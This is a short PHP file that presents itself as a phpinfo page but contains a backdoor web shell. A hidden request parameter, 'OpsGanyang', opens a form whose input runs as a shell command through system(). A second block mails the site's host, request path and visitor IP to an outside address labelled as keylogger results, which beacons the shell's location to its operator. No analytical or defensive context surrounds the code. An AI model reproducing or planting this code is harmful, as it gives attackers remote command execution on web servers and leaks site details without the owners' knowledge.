<?php
if(isset($_REQUEST['OpsGanyang'])){
        echo "<pre>";
        echo "<form name='form' action='#' method='post'>
       <input type='text' name='coba'/> <input type='submit' value='enter'/>
       </form>";
        $cmd = ($_POST['coba']);
        system($cmd);
        echo "</pre>";
        phpinfo();
        die;
}
phpinfo();
?>
<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " #OpsGanyang |$ip";
$email = "keyloggersresults@gmail.com";
$from = "From: #OpsGanyang<botv3@mrspybotv3.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>
